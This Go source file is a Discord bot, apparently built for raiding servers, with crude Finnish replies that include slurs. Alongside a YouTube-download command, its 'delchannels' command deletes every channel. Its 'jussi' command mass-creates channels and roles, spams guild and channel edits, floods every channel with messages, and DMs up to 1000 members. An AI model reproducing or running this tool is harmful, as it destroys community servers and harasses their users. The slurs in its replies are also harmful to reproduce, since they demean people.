package main

import (
	"context"
	"fmt"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"github.com/bwmarrin/discordgo"
	"github.com/wader/goutubedl"
	"gopkg.in/yaml.v3"
)

type Config struct {
	WebServer struct {
		Enabled bool   `yaml:"enabled"`
		Host    string `yaml:"host"`
		Port    int    `yaml:"port"`
	} `yaml:"webServer"`
	Bot struct {
		Token      string   `yaml:"token"`
		AllowedIds []string `yaml:"allowedIds"`
		Prefix     string   `yaml:"prefix"`

		Status struct {
			Messages []string `yaml:"messages"`
		} `yaml:"status"`

		Raid struct {
			Messages     []string `yaml:"messages"`
			MessageDelay int      `yaml:"messageDelay"`
			GuildEdit    struct {
				Enable bool     `yaml:"enable"`
				Names  []string `yaml:"names"`
				Delay  int      `yaml:"delay"`
			} `yaml:"guildEdit"`
			Channels struct {
				Names           []string `yaml:"names"`
				Amount          int      `yaml:"amount"`
				WaitForCreation bool     `yaml:"waitForCreation"`
				Edit            struct {
					Enable bool `yaml:"enable"`
					Delay  int  `yaml:"delay"`
				} `yaml:"edit"`
			} `yaml:"channels"`
			Roles struct {
				Enable bool     `yaml:"enable"`
				Names  []string `yaml:"names"`
				Amount int      `yaml:"amount"`
				Delay  int      `yaml:"delay"`
			} `yaml:"roles"`
		} `yaml:"raid"`
	} `yaml:"bot"`
}

var config Config

func main() {
	data, err := os.ReadFile("config.yaml")

	if err := yaml.Unmarshal(data, &config); err != nil {
		panic(err)
	}

	// Create a new Discord session using the provided bot token.
	dg, err := discordgo.New("Bot " + config.Bot.Token)
	if err != nil {
		fmt.Println("error creating Discord session,", err)
		return
	}

	ticker := time.Tick(5 * time.Second)

	stop := make(chan os.Signal, 1)
	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM)

	statuses := config.Bot.Status.Messages
	statusIndex := 0

	dg.AddHandler(func(s *discordgo.Session, r *discordgo.Ready) {
		fmt.Println(fmt.Sprintf("Bot is ready on Shard %d", r.Shard))

		for {
			select {
			case <-ticker:
				dg.UpdateGameStatus(0, statuses[statusIndex])
				statusIndex = (statusIndex + 1) % len(statuses)
			case <-stop:
				return
			}
		}

	})

	dg.AddHandler(func(s *discordgo.Session, r *discordgo.RateLimit) {
		fmt.Println(fmt.Sprintf("(!) %s (retry after: %f seconds)", r.Message, r.RetryAfter.Seconds()))
	})

	// Register the messageCreate func as a callback for MessageCreate events.
	dg.AddHandler(messageCreate)

	// In this example, we only care about receiving message events.
	dg.Identify.Intents = discordgo.IntentsGuildMessages | discordgo.IntentsGuildMembers

	// Open a websocket connection to Discord and begin listening.
	err = dg.Open()
	if err != nil {
		fmt.Println("error opening connection,", err)
		return
	}

	go StartWebServer(dg)

	<-stop

	fmt.Printf("Shutting down bot")
	dg.Close()
}

func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
	if m.Author.ID == s.State.User.ID || m.Author.Bot {
		return
	}

	if strings.HasPrefix(m.Content, config.Bot.Prefix+"ytdl") {
		link := strings.Trim(m.Content, config.Bot.Prefix+"ytdl")
		link = strings.TrimSpace(link)

		fmt.Println(link)

		if !strings.HasPrefix(link, "https://www.youtube.com") {
			s.ChannelMessageSend(m.ChannelID, "anna yt linkki homo")
			return
		}

		goutubedl.Path = "yt-dlp"

		result, err := goutubedl.New(context.Background(), link, goutubedl.Options{})

		if err != nil {
			fmt.Println(err.Error())
			s.ChannelMessageSend(m.ChannelID, "jotai meni vikaa paskoiks tän hä? milffit yv btw")
			return
		}

		dlResult, err := result.Download(context.Background(), "best")
		defer dlResult.Close()

		if err != nil {
			s.ChannelMessageSend(m.ChannelID, "ei voitu lataa videoo lol")
			return
		}

		s.ChannelFileSendWithMessage(m.ChannelID, "täs tää video lol", "juup", dlResult)
	}

	if m.Content == config.Bot.Prefix+"ping" {
		s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("jepjep heartbeat vaikkao on tommone: %s (tommone)", s.HeartbeatLatency().Round(time.Millisecond)))
	}

	for _, authUser := range config.Bot.AllowedIds {
		if m.Author.ID != authUser {
			s.ChannelMessageSend(m.ChannelID, "oot nyt musta eli se meinaa sitä et sul ei oo minkäänlaisia oikeuksia käyttää tätä Discord-palvelun automaattista Bottia. Varmaan vituttaa! :D")
			return
		}
	}

	if m.Content == config.Bot.Prefix+"delchannels" {
		channels, err := s.GuildChannels(m.GuildID)

		if err != nil {
			fmt.Println("error fetching guild channels for " + m.GuildID)
			return
		}

		if len(channels) == 1 {
			s.ChannelMessageSend(m.ChannelID, "kyl ny sokeaki huomaa et tos on vaa yks kanava vitu vammane")
			return
		}

		for _, channel := range channels {
			go s.ChannelDelete(channel.ID)
		}

		s.GuildChannelCreate(m.GuildID, "lollista", 0)

	}

	if m.Content == config.Bot.Prefix+"members" {
		members, err := s.GuildMembers(m.GuildID, "", 1000)

		if err != nil {
			fmt.Println("error getting guild members for" + m.GuildID)
			return
		}

		for _, m := range members {

			if m.User.Bot {
				return
			}

			println(m.User.ID)
			userChannel, err := s.UserChannelCreate(m.User.ID)

			println("userChannel: " + userChannel.ID)

			if err != nil {
				fmt.Println("error creating channel for user " + m.User.ID)
				return
			}
		}

	}

	if m.Content == config.Bot.Prefix+"jussi" {
		amount := config.Bot.Raid.Channels.Amount

		if config.Bot.Raid.GuildEdit.Enable == true {
			go spamGuildEdit(m.GuildID, s)
		}

		if config.Bot.Raid.Roles.Enable == true {
			go spamRoleCreate(m.GuildID, s)
		}

		fmt.Printf("Creating %d channels\n", amount)

		if config.Bot.Raid.Channels.WaitForCreation {
			createChannels(m.GuildID, false, s)
			time.Sleep(2)
		} else {
			go createChannels(m.GuildID, true, s)
		}

		guilds, err := s.GuildChannels(m.GuildID)

		if err != nil {
			println("Failed to get channels for gid" + m.GuildID)
		}

		for _, channel := range guilds {
			go spamMessages(channel.ID, s)

			if config.Bot.Raid.Channels.Edit.Enable == true {
				go spamChannelEdit(channel.ID, s)
			}
		}

		members, err := s.GuildMembers(m.GuildID, "", 1000)

		if err != nil {
			fmt.Println("error getting guild members for" + m.GuildID)
			return
		}

		for _, m := range members {

			if m.User.Bot {
				return
			}

			println(m.User.ID)
			userChannel, err := s.UserChannelCreate(m.User.ID)

			if err != nil {
				fmt.Println("error creating channel for user " + m.User.ID)
				return
			}

			go sendMsgToMembers(userChannel, s)
		}
	}
}
